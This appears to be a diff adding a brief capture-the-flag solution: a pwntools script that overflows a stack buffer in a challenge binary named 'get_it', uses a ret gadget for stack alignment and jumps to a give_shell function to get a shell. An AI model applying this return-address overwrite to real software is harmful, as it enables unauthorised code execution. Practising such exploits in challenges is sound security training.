@@ -1,0 +1,13 @@
+Challenge was a pwn challenge with stack alignment
+
+from pwn import *
+
+elf = ELF("./get_it")
+
+p=elf.process()
+
+p.recv()
+
+pay = b'a'*0x28 + p64(0x4005f7) +  p64(elf.sym.give_shell)
+p.sendline(pay)
+p.interactive()
